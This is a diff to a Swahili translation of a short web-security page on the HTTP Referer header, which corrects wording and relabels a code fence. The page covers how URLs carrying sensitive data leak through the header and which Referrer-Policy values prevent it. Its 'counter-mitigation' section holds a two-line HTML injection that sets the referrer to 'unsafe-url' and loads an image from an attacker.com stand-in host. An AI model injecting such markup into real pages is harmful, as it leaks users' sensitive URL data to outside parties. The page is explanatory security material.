@@ -2,7 +2,7 @@
 
 # Referrer headers and policy
 
-Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ipi ilikuwa ukurasa wa awali uliozuru.
+Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ukurasa gani wa awali ulitembelewa.
 
 ## Taarifa nyeti zilizovuja
 
@@ -10,7 +10,7 @@ Ikiwa katika wakati fulani ndani ya ukurasa wa wavuti taarifa nyeti ziko kwenye 
 
 ## Mitigation
 
-Unaweza kufanya kivinjari kifuatilie **Referrer-policy** ambayo inaweza **kuepusha** taarifa nyeti kutumwa kwa programu nyingine za wavuti:
+Unaweza kufanya kivinjari kufuata **Referrer-policy** ambayo inaweza **kuepusha** taarifa nyeti kutumwa kwa programu nyingine za wavuti:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Counter-Mitigation
 
 Unaweza kubadilisha sheria hii kwa kutumia tag ya meta ya HTML (mshambuliaji anahitaji kutumia na kuingiza HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
